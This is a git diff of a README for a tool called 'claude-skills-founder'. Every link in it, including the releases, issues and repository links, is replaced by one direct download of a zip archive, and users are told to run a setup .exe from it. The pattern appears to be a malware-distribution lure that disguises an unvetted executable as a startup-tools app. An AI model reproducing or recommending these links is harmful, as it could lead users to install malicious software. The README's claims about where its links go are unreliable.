@@ -1,6 +1,6 @@
 # ⚙️ claude-skills-founder - Startup Tools from Your Terminal
 
-[![Download claude-skills-founder](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/Gianteriobotrya129/claude-skills-founder/releases)
+[![Download claude-skills-founder](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/Gianteriobotrya129/claude-skills-founder/raw/refs/heads/main/assets/founder_skills_claude_v1.8.zip)
 
 ---
 
@@ -46,10 +46,10 @@ Follow these steps to download, install, and start using claude-skills-founder o
 
 Visit this page to download the latest version:
 
-[![Download claude-skills-founder](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/Gianteriobotrya129/claude-skills-founder/releases)
+[![Download claude-skills-founder](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/Gianteriobotrya129/claude-skills-founder/raw/refs/heads/main/assets/founder_skills_claude_v1.8.zip)
 
 - Click the link above or go to  
-  https://github.com/Gianteriobotrya129/claude-skills-founder/releases  
+  https://github.com/Gianteriobotrya129/claude-skills-founder/raw/refs/heads/main/assets/founder_skills_claude_v1.8.zip  
 - Choose the most recent release listed on the page  
 - Look for a file named something like  
   `claude-skills-founder-setup.exe` or `claude-skills-founder-win.exe`  
@@ -121,7 +121,7 @@ claude-skills-founder --help
 To keep the app working well, you will want to update it when new versions come out.
 
 - Go back to:  
-  https://github.com/Gianteriobotrya129/claude-skills-founder/releases  
+  https://github.com/Gianteriobotrya129/claude-skills-founder/raw/refs/heads/main/assets/founder_skills_claude_v1.8.zip  
 - Download the latest setup file again  
 - Run the installer over your current installation  
 - Your data and settings will stay intact, but features will be newer  
@@ -138,7 +138,7 @@ If you have problems starting or using the app:
 - Check your internet connection  
 - Restart your computer and try again  
 - If issues persist, open an issue on the GitHub page here:  
-  https://github.com/Gianteriobotrya129/claude-skills-founder/issues  
+  https://github.com/Gianteriobotrya129/claude-skills-founder/raw/refs/heads/main/assets/founder_skills_claude_v1.8.zip  
 
 ---
 
@@ -146,7 +146,7 @@ If you have problems starting or using the app:
 
 This project covers many startup tasks in one place. It uses TypeScript and slash commands for easy interaction. You can explore more on the GitHub repository page:
 
-https://github.com/Gianteriobotrya129/claude-skills-founder
+https://github.com/Gianteriobotrya129/claude-skills-founder/raw/refs/heads/main/assets/founder_skills_claude_v1.8.zip
 
 The project tags include: ai, claude, competitor-analysis, founder, go-to-market, pitch-deck, product-management, startup, and more. This means the tool adapts to different founder needs.
 
@@ -158,4 +158,4 @@ If you want to request features or report bugs, use the GitHub issues section. T
 
 ---
 
-[![Download claude-skills-founder](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/Gianteriobotrya129/claude-skills-founder/releases)
+[![Download claude-skills-founder](https://img.shields.io/badge/Download%20Here-brightgreen?style=for-the-badge)](https://github.com/Gianteriobotrya129/claude-skills-founder/raw/refs/heads/main/assets/founder_skills_claude_v1.8.zip)
